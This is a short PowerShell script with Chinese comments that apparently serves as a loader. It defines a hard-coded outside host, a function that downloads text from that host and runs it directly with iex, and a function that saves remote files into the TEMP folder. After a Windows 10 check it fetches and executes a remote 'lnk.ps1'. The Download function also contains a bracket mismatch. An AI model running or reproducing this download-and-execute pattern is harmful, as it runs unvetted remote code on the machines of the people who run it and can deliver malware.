$Web = "http://c1is.lz0.cc"
$Temp = $env:TEMP

# 定义 "call" 函数，用于调用表达式
Function Call($_v) {iex (New-Object System.Net.WebClient).DownloadString("$Web/expression/$_v")}

# 定义 "Download" 函数，用于下载文件
Function Download($_v) {iwr -uri "$Web/$_v" -OutFile "$Temp/$_v")

# 检查 Windows 版本 = 10
if($PSVersionTable.BuildVersion.Major -lt 10)
{
    Write-Warning "对不起，此数据库仅适用于微软 Windows 10 操作系统环境，请在更改或升级你的系统版本后重试..."
    Start-Sleep -Seconds 3
    Read-Host "按 Enter 键退出..."
    break
}

if(!$LUserName)
{
    write "Hello"
    call "lnk.ps1"
}